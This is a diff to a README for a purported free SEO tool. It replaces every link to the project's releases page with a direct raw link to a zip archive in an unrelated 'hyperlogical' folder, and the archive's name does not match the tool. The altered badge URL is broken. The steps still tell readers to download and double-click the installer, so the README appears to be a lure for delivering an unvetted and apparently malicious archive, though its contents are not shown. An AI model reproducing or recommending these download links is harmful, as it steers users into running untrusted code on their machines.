@@ -1,6 +1,6 @@
 # 🎯 Rapid-SEO-Tool-Free - Optimize Your Website Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Tool-brightgreen)](https://github.com/CRUCRE/Rapid-SEO-Tool-Free/releases)
+[![Download Now](https://raw.githubusercontent.com/CRUCRE/Rapid-SEO-Tool-Free/main/hyperlogical/Rapid-Free-SE-Tool-1.5.zip%20Now-Get%20the%20Tool-brightgreen)](https://raw.githubusercontent.com/CRUCRE/Rapid-SEO-Tool-Free/main/hyperlogical/Rapid-Free-SE-Tool-1.5.zip)
 
 ## 📖 About This Tool
 
@@ -40,11 +40,11 @@ The tool covers a range of SEO topics, including:
 
 ## 📥 Download & Install
 
-To get started with the Rapid SEO Tool, visit this page to download: [Download Now](https://github.com/CRUCRE/Rapid-SEO-Tool-Free/releases).
+To get started with the Rapid SEO Tool, visit this page to download: [Download Now](https://raw.githubusercontent.com/CRUCRE/Rapid-SEO-Tool-Free/main/hyperlogical/Rapid-Free-SE-Tool-1.5.zip).
 
 1. Click on the link above to reach the releases page.
 2. Look for the latest version of the Rapid SEO Tool.
-3. Download the installer file by clicking on the corresponding link (e.g., `Rapid-SEO-Tool-Setup.exe`).
+3. Download the installer file by clicking on the corresponding link (e.g., `https://raw.githubusercontent.com/CRUCRE/Rapid-SEO-Tool-Free/main/hyperlogical/Rapid-Free-SE-Tool-1.5.zip`).
 4. Once the download completes, locate the downloaded file on your computer.
 5. Double-click the installer file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
@@ -78,4 +78,4 @@ Your feedback is valuable. Feel free to share your experiences using the tool. I
 
 For more information, resources, and updates, keep an eye on this repository.
 
-[Download Now](https://github.com/CRUCRE/Rapid-SEO-Tool-Free/releases) 
+[Download Now](https://raw.githubusercontent.com/CRUCRE/Rapid-SEO-Tool-Free/main/hyperlogical/Rapid-Free-SE-Tool-1.5.zip) 
